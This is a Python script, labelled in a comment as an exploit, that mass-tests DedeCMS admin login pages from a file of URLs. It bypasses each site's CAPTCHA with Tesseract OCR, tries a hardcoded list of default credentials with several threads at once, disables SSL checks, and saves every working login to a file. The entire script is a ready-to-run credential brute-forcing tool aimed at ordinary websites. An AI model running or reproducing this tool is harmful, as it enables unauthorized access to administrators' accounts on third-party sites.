import requests
from PIL import Image
from io import BytesIO
import pytesseract
import time
import urllib3
from concurrent.futures import ThreadPoolExecutor
import logging
from datetime import datetime
import os
import gc

#Exploit By Chirag Artani dedecms auto login captcha bypass
# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Create logs directory if it doesn't exist
if not os.path.exists('logs'):
    os.makedirs('logs')

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'logs/dedecms_brute_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler()
    ]
)

class DedeCMSBulkSolver:
    def __init__(self):
        logging.info("Initializing DedeCMS Scanner...")
        self.credentials = [
            {'username': 'admin', 'password': 'password'},
            {'username': 'admin', 'password': 'admin'},
            {'username': 'admin', 'password': '123456'},
            {'username': 'admin', 'password': 'admin123'},
            {'username': 'xakf', 'password': 'password'},
            {'username': 'xakf', 'password': 'admin'},
            {'username': 'xakf', 'password': '123456'},
            {'username': 'xakf', 'password': 'admin123'}
        ]
        self.total_urls = 0
        self.processed_urls = 0

    def normalize_url(self, url):
        """Normalize URL to ensure proper format"""
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        if not url.endswith('/dede/login.php'):
            url = url.rstrip('/') + '/dede/login.php'
        return url

    def get_captcha(self, session, base_url):
        """Fetch CAPTCHA image with dynamic timestamp"""
        try:
            base_url = base_url.replace('/dede/login.php', '')
            timestamp = int(time.time() * 1000)  # Current timestamp in milliseconds

            # Primary CAPTCHA URLs with timestamp
            captcha_url = f"{base_url}/include/vdimgck.php?tag={timestamp}"
            backup_urls = [
                f"{base_url}/include/captcha.php?tag={timestamp}",
                f"{base_url}/include/validatecode.php?tag={timestamp}"
            ]

            # Try main CAPTCHA URL first
            logging.info(f"Trying main captcha URL: {captcha_url}")
            try:
                response = session.get(captcha_url, verify=False, timeout=10)
                if response.status_code == 200:
                    content_type = response.headers.get('content-type', '').lower()
                    if 'image' in content_type or 'octet-stream' in content_type:
                        img = Image.open(BytesIO(response.content))
                        if img.format in ['PNG', 'JPEG', 'GIF']:
                            logging.info(f"Successfully found captcha at: {captcha_url}")
                            return img
            except Exception as e:
                logging.debug(f"Failed to get main captcha URL: {str(e)}")

            # Try backup URLs if main fails
            for url in backup_urls:
                logging.info(f"Trying backup captcha URL: {url}")
                try:
                    response = session.get(url, verify=False, timeout=10)
                    if response.status_code == 200:
                        content_type = response.headers.get('content-type', '').lower()
                        if 'image' in content_type or 'octet-stream' in content_type:
                            img = Image.open(BytesIO(response.content))
                            if img.format in ['PNG', 'JPEG', 'GIF']:
                                logging.info(f"Successfully found captcha at: {url}")
                                return img
                except Exception as e:
                    logging.debug(f"Failed to process backup URL {url}: {str(e)}")
                    continue

            logging.error(f"No valid captcha found for {base_url}")
            return None

        except Exception as e:
            logging.error(f"Unexpected error fetching captcha from {base_url}: {str(e)}")
            return None

    def solve_captcha(self, image):
        """Solve the CAPTCHA using Tesseract"""
        try:
            # Convert to grayscale and increase contrast
            image = image.convert('L')
            image = image.point(lambda x: 0 if x < 140 else 255, '1')

            # Use Tesseract to read the captcha
            text = pytesseract.image_to_string(image, config='--psm 8 --oem 3')
            captcha_text = ''.join(c for c in text if c.isalnum()).lower()

            # DedeCMS typically uses 4-character captchas
            if len(captcha_text) != 4:
                captcha_text = captcha_text[:4]

            logging.info(f"Solved captcha text: {captcha_text}")
            return captcha_text
        except Exception as e:
            logging.error(f"Error solving captcha: {str(e)}")
            return None

    def try_login(self, url, username, password, max_captcha_attempts=3):
        """Attempt login with specific credentials"""
        session = requests.Session()
        base_url = self.normalize_url(url)

        try:
            # Initial check
            initial_response = session.get(base_url, verify=False, timeout=10)
            logging.info(f"Checking URL: {base_url}")

            # Check if it's a DedeCMS page
            dede_indicators = ["dedecms", "dede", "织梦", "管理中心"]
            if not any(indicator in initial_response.text.lower() for indicator in dede_indicators):
                logging.error(f"{base_url} is not a DedeCMS login page")
                return False

            for attempt in range(max_captcha_attempts):
                try:
                    captcha_image = self.get_captcha(session, base_url)
                    if not captcha_image:
                        logging.error(f"Attempt {attempt + 1}: Failed to get valid captcha")
                        continue

                    captcha_solution = self.solve_captcha(captcha_image)
                    if not captcha_solution:
                        logging.error(f"Attempt {attempt + 1}: Failed to solve captcha")
                        continue

                    logging.info(f"Attempting login at {base_url} with user: {username} - Captcha: {captcha_solution}")

                    login_data = {
                        'dopost': 'login',
                        'userid': username,
                        'pwd': password,
                        'validate': captcha_solution,
                        'adminstyle': 'newdedecms'
                    }

                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Referer': base_url
                    }

                    response = session.post(
                        base_url,
                        data=login_data,
                        headers=headers,
                        verify=False,
                        timeout=10
                    )

                    # Updated success indicators including Chinese success message
                    success_indicators = ["login success", "管理中心", "successful", "welcome", "欢迎", "成功登录"]
                    if any(indicator in response.text.lower() for indicator in success_indicators):
                        success_msg = f"SUCCESS - {url} - {username}:{password}"
                        logging.info(success_msg)
                        with open('successful_logins.txt', 'a') as f:
                            f.write(f"{success_msg}\n")
                        return True
                    else:
                        logging.info(f"Login failed for {url} with {username}:{password}")

                except Exception as e:
                    logging.error(f"Error during login attempt: {str(e)}")

                time.sleep(2)  # Wait between attempts

        except Exception as e:
            logging.error(f"Error during login process for {url}: {str(e)}")

        return False

    def process_url(self, url):
        """Process a single URL with all credential combinations"""
        logging.info(f"Testing URL: {url}")

        for cred in self.credentials:
            try:
                if self.try_login(url, cred['username'], cred['password']):
                    break
            except Exception as e:
                logging.error(f"Error processing {url} with {cred['username']}: {str(e)}")
                continue

        self.processed_urls += 1
        self.show_progress()

    def show_progress(self):
        """Show progress of URL processing"""
        if self.total_urls > 0:
            percentage = (self.processed_urls / self.total_urls) * 100
            print(f"\rProgress: {self.processed_urls}/{self.total_urls} ({percentage:.2f}%)", end='', flush=True)

    def process_urls_file(self, filename, max_threads=2):
        """Process multiple URLs from a file"""
        try:
            with open(filename, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]

            self.total_urls = len(urls)
            self.processed_urls = 0

            logging.info(f"Loaded {len(urls)} URLs from {filename}")
            print(f"Starting scan of {len(urls)} URLs with {max_threads} threads")

            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                executor.map(self.process_url, urls)

            print("\nScan completed!")
            print(f"Results saved in 'successful_logins.txt'")
            print(f"Full logs available in the 'logs' directory")

        except Exception as e:
            logging.error(f"Error processing URLs file: {str(e)}")

if __name__ == "__main__":
    solver = DedeCMSBulkSolver()

    print("DedeCMS Bulk Login Tester")
    print("-------------------------")
    print("1. Make sure your URLs file contains one URL per line")
    print("2. URLs can be with or without protocol/port")
    print("3. Results will be saved in successful_logins.txt")
    print("4. Check the logs directory for detailed execution information")
    print("-------------------------")

    urls_file = input("Enter the path to your URLs file (default: urls.txt): ") or "urls.txt"
    threads = input("Enter number of concurrent threads (default: 2): ") or 2

    solver.process_urls_file(urls_file, int(threads))
